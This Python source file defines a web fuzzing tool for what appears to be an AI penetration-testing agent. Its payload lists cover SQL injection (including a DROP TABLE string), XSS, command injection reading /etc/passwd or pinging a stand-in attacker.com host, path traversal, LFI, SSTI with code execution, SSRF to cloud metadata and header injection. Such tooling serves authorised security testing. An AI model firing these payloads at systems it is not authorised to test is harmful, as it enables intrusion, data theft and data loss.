"""Smart fuzzing tool for parameter and input testing."""

import random
import string
from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)

ToolAction = Literal[
    "fuzz_params",
    "fuzz_headers",
    "fuzz_json",
    "mutation_fuzz",
    "generate_payloads",
]


@register_tool(sandbox_execution=True)
def smart_fuzzer(
    action: ToolAction,
    target: str | None = None,
    params: dict | None = None,
    headers: dict | None = None,
    json_body: dict | None = None,
    base_value: str | None = None,
    fuzz_type: str | None = None,
    count: int | None = None,
    **kwargs: Any,
) -> dict[str, Any] | str:
    """Smart fuzzing tool for parameter and input testing.

    Args:
        action: The action to perform
        target: Target URL or endpoint
        params: Parameters to fuzz
        headers: Headers to fuzz
        json_body: JSON body to fuzz
        base_value: Base value for mutation fuzzing
        fuzz_type: Type of fuzzing (sqli, xss, format_string, etc.)
        count: Number of fuzz iterations

    Returns:
        Results dict or error message
    """
    VALID_PARAMS = {
        "action", "target", "params", "headers", "json_body",
        "base_value", "fuzz_type", "count",
    }
    VALID_ACTIONS = [
        "fuzz_params",
        "fuzz_headers",
        "fuzz_json",
        "mutation_fuzz",
        "generate_payloads",
    ]

    if unknown_error := validate_unknown_params(kwargs, VALID_PARAMS, "smart_fuzzer"):
        return unknown_error

    if action_error := validate_action_param(action, VALID_ACTIONS, "smart_fuzzer"):
        return action_error

    if action == "fuzz_params":
        if param_error := validate_required_param(target, "target", action, "smart_fuzzer"):
            return param_error

        test_params = params or {"id": "1", "search": "test", "page": "1"}
        fuzzing_type = fuzz_type or "all"

        # Generate fuzz payloads for each parameter
        fuzz_payloads = {
            "sqli": [
                "'", "''", "\"", "\"\"", "`", "1'", "1\"",
                "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
                "1; DROP TABLE users--", "1' AND '1'='1",
                "1 UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                "'><script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "{{7*7}}", "${7*7}", "#{7*7}",
            ],
            "command_injection": [
                "; ls", "| ls", "& ls", "`ls`",
                "$(ls)", "; cat /etc/passwd",
                "| cat /etc/passwd", "&& whoami",
                "|| whoami", "\n/bin/ls",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
                "..%252f..%252f..%252fetc/passwd",
            ],
            "format_string": [
                "%s%s%s%s%s", "%x%x%x%x", "%n%n%n%n",
                "%p%p%p%p", "{0}", "{0:x}",
            ],
            "overflow": [
                "A" * 100, "A" * 1000, "A" * 10000,
                "A" * 50000, "-1", "0", "99999999",
                "2147483647", "-2147483648",
            ],
            "special_chars": [
                "\x00", "\r\n", "\n", "\r",
                "%00", "%0a", "%0d", "\t",
                "\\", "/", "&", "=", "?",
            ],
        }

        if fuzzing_type == "all":
            payloads_to_use = []
            for pl in fuzz_payloads.values():
                payloads_to_use.extend(pl[:5])  # First 5 from each
        else:
            payloads_to_use = fuzz_payloads.get(fuzzing_type, fuzz_payloads["sqli"])

        return {
            "action": "fuzz_params",
            "target": target,
            "original_params": test_params,
            "fuzz_type": fuzzing_type,
            "payloads": payloads_to_use,
            "description": "Fuzz URL parameters with various payloads",
            "methodology": [
                "1. Baseline request with original values",
                "2. Fuzz each parameter individually",
                "3. Compare responses for anomalies",
                "4. Monitor for errors, delays, or behavior changes",
            ],
            "python_example": f'''
import requests
from urllib.parse import urlencode

target = "{target}"
params = {test_params}
payloads = {payloads_to_use[:10]}

baseline = requests.get(target, params=params)
baseline_len = len(baseline.text)

for param_name in params.keys():
    for payload in payloads:
        fuzz_params = params.copy()
        fuzz_params[param_name] = payload

        try:
            response = requests.get(target, params=fuzz_params, timeout=10)

            # Detect anomalies
            if response.status_code == 500:
                print(f"[!] 500 Error: {{param_name}}={{payload}}")
            elif len(response.text) > baseline_len * 2:
                print(f"[!] Large response: {{param_name}}={{payload}}")
            elif "error" in response.text.lower():
                print(f"[!] Error in response: {{param_name}}={{payload}}")
        except Exception as e:
            print(f"[-] Exception: {{param_name}}={{payload}}: {{e}}")
''',
            "ffuf_command": f'''
# Fuzz with ffuf
ffuf -u "{target}?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
ffuf -u "{target}?id=FUZZ" -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
''',
            "detection_indicators": {
                "sqli": ["SQL syntax", "mysql_", "ORA-", "PostgreSQL", "sqlite"],
                "xss": ["<script", "alert(", "reflected in response"],
                "command_injection": ["uid=", "root:", "Directory of"],
                "path_traversal": ["root:x:", "[extensions]", "passwd"],
            },
        }

    elif action == "fuzz_headers":
        if param_error := validate_required_param(target, "target", action, "smart_fuzzer"):
            return param_error

        test_headers = headers or {"User-Agent": "Mozilla/5.0", "X-Forwarded-For": "127.0.0.1"}

        header_payloads = {
            "host_header": [
                "evil.com", "localhost", "127.0.0.1",
                "internal.target.com", "target.com.evil.com",
            ],
            "xff_ssrf": [
                "127.0.0.1", "localhost", "169.254.169.254",
                "10.0.0.1", "192.168.1.1", "0.0.0.0",
            ],
            "cache_poisoning": [
                "X-Forwarded-Host: evil.com",
                "X-Original-URL: /admin",
                "X-Rewrite-URL: /admin",
            ],
            "http_smuggling": [
                "Transfer-Encoding: chunked",
                "Transfer-Encoding : chunked",
                "Transfer-Encoding: xchunked",
            ],
            "crlf_injection": [
                "test\r\nX-Injected: header",
                "test%0d%0aSet-Cookie: evil=true",
            ],
        }

        return {
            "action": "fuzz_headers",
            "target": target,
            "original_headers": test_headers,
            "header_payloads": header_payloads,
            "injectable_headers": [
                "Host", "X-Forwarded-For", "X-Forwarded-Host",
                "X-Original-URL", "X-Rewrite-URL", "X-Custom-IP-Authorization",
                "X-Real-IP", "True-Client-IP", "Client-IP",
                "Forwarded", "X-Client-IP", "CF-Connecting-IP",
                "User-Agent", "Referer", "Origin",
            ],
            "methodology": [
                "1. Test each injectable header",
                "2. Watch for behavior changes",
                "3. Check for SSRF via IP spoofing headers",
                "4. Test host header attacks",
                "5. Look for caching issues",
            ],
            "python_example": f'''
import requests

target = "{target}"
injectable_headers = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
    "X-Remote-IP", "X-Client-IP", "True-Client-IP"
]

# Test SSRF via IP headers
for header in injectable_headers:
    test_headers = {{header: "127.0.0.1"}}
    response = requests.get(target, headers=test_headers)

    if response.status_code == 200:
        print(f"[+] {{header}}: 127.0.0.1 - Possible bypass")

# Test Host header
for host in ["evil.com", "localhost", "127.0.0.1"]:
    response = requests.get(target, headers={{"Host": host}})
    if host in response.text:
        print(f"[!] Host header reflected: {{host}}")
''',
        }

    elif action == "fuzz_json":
        if param_error := validate_required_param(json_body, "json_body", action, "smart_fuzzer"):
            return param_error

        json_mutations = {
            "type_confusion": [
                {"value": "string", "original": "expecting int"},
                {"value": 123, "original": "expecting string"},
                {"value": [], "original": "expecting object"},
                {"value": {}, "original": "expecting array"},
                {"value": None, "original": "expecting value"},
                {"value": True, "original": "expecting something else"},
            ],
            "boundary_values": [
                0, -1, 1, 2147483647, -2147483648,
                9999999999999999, 0.1, -0.1, 1.7976931348623157e+308,
            ],
            "string_payloads": [
                "", " ", "null", "undefined", "NaN",
                "true", "false", "'", "\"", "\\",
                "<script>alert(1)</script>",
                "{{7*7}}", "${7*7}",
            ],
            "array_payloads": [
                [], [None], [1, 2, 3] * 1000,
                [[[[[[]]]]]], [{"a": "b"}],
            ],
            "prototype_pollution": [
                {"__proto__": {"admin": True}},
                {"constructor": {"prototype": {"admin": True}}},
                {"__proto__": {"toString": "polluted"}},
            ],
        }

        return {
            "action": "fuzz_json",
            "original_body": json_body,
            "mutations": json_mutations,
            "description": "Fuzz JSON body with type confusion and edge cases",
            "methodology": [
                "1. Test type confusion for each field",
                "2. Test boundary values for numeric fields",
                "3. Test injection payloads in string fields",
                "4. Test prototype pollution",
                "5. Test deep nesting and large arrays",
            ],
            "python_example": f'''
import requests
import json
import copy

target = "{target}"
original_body = {json.dumps(json_body)}

def fuzz_json_field(body, field_path, payload):
    """Replace a field value with fuzz payload."""
    mutated = copy.deepcopy(body)
    keys = field_path.split('.')
    obj = mutated
    for key in keys[:-1]:
        obj = obj[key]
    obj[keys[-1]] = payload
    return mutated

# Type confusion testing
for field in original_body.keys():
    for payload in [None, [], {{}}, "", 0, True]:
        mutated = fuzz_json_field(original_body, field, payload)
        response = requests.post(target, json=mutated)

        if response.status_code == 500:
            print(f"[!] 500 Error: {{field}} = {{payload}}")
        elif "error" in response.text.lower():
            print(f"[!] Error response: {{field}} = {{payload}}")
''',
            "common_issues": [
                "Type confusion leading to auth bypass",
                "Prototype pollution via __proto__",
                "Mass assignment via extra fields",
                "Integer overflow in numeric fields",
                "JSON injection in string fields",
            ],
        }

    elif action == "mutation_fuzz":
        if param_error := validate_required_param(base_value, "base_value", action, "smart_fuzzer"):
            return param_error

        mutation_count = count or 50

        # Generate mutations of the base value
        mutations = []

        # Character insertions
        for char in ["'", "\"", "<", ">", "&", "\\", "\x00", "\n", "\r"]:
            mutations.append(base_value + char)
            mutations.append(char + base_value)
            if len(base_value) > 2:
                mid = len(base_value) // 2
                mutations.append(base_value[:mid] + char + base_value[mid:])

        # Character replacements
        for i, c in enumerate(base_value):
            if c.isalpha():
                mutations.append(base_value[:i] + c.upper() if c.islower() else c.lower() + base_value[i+1:])
            if c.isdigit():
                mutations.append(base_value[:i] + str((int(c) + 1) % 10) + base_value[i+1:])

        # Bit flipping simulation
        mutations.extend([
            base_value.upper(),
            base_value.lower(),
            base_value.swapcase(),
            base_value[::-1],  # Reverse
        ])

        # Length variations
        mutations.extend([
            "",
            base_value * 2,
            base_value * 10,
            base_value[:len(base_value)//2],
        ])

        # Encoding variations
        mutations.extend([
            base_value.replace(" ", "+"),
            base_value.replace(" ", "%20"),
            "".join(f"%{ord(c):02x}" for c in base_value),  # URL encode all
        ])

        return {
            "action": "mutation_fuzz",
            "base_value": base_value,
            "mutation_count": len(mutations[:mutation_count]),
            "mutations": mutations[:mutation_count],
            "description": "Generate mutations of a base value for fuzzing",
            "mutation_techniques": [
                "Character insertion (special chars)",
                "Character replacement",
                "Case mutations",
                "Length variations",
                "Encoding variations",
                "Bit flipping",
                "Boundary values",
            ],
            "usage": "Use these mutations to test input handling",
        }

    elif action == "generate_payloads":
        payload_type = fuzz_type or "mixed"
        payload_count = count or 100

        payload_templates = {
            "sqli": [
                "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--",
                "\" OR \"1\"=\"1", "' UNION SELECT NULL--",
                "' AND SLEEP(5)--", "' AND 1=1--", "') OR ('1'='1",
                "1'; WAITFOR DELAY '0:0:5'--",
                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
                "<body onload=alert(1)>",
                "'><script>alert(1)</script>",
                "\"><img src=x onerror=alert(1)>",
                "<iframe src=\"javascript:alert(1)\">",
                "'-alert(1)-'",
                "{{constructor.constructor('alert(1)')()}}",
            ],
            "ssti": [
                "{{7*7}}", "${7*7}", "#{7*7}",
                "<%= 7*7 %>", "{7*7}", "{{config}}",
                "{{self.__class__.__mro__[2].__subclasses__()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
            ],
            "lfi": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd%00",
                "php://filter/convert.base64-encode/resource=index.php",
                "file:///etc/passwd",
                "/proc/self/environ",
            ],
            "command": [
                "; id", "| id", "& id", "`id`", "$(id)",
                "; cat /etc/passwd", "| cat /etc/passwd",
                "&& whoami", "|| whoami",
                "'; ping -c 5 attacker.com; '",
            ],
        }

        if payload_type == "mixed":
            all_payloads = []
            for payloads in payload_templates.values():
                all_payloads.extend(payloads)
            selected_payloads = all_payloads[:payload_count]
        else:
            selected_payloads = payload_templates.get(
                payload_type,
                payload_templates["sqli"]
            )[:payload_count]

        return {
            "action": "generate_payloads",
            "payload_type": payload_type,
            "count": len(selected_payloads),
            "payloads": selected_payloads,
            "available_types": list(payload_templates.keys()),
            "description": f"Generated {len(selected_payloads)} {payload_type} payloads",
            "wordlist_resources": [
                "/usr/share/seclists/Fuzzing/",
                "/usr/share/wordlists/",
                "https://github.com/danielmiessler/SecLists",
                "https://github.com/swisskyrepo/PayloadsAllTheThings",
            ],
        }

    return generate_usage_hint("smart_fuzzer", VALID_ACTIONS)
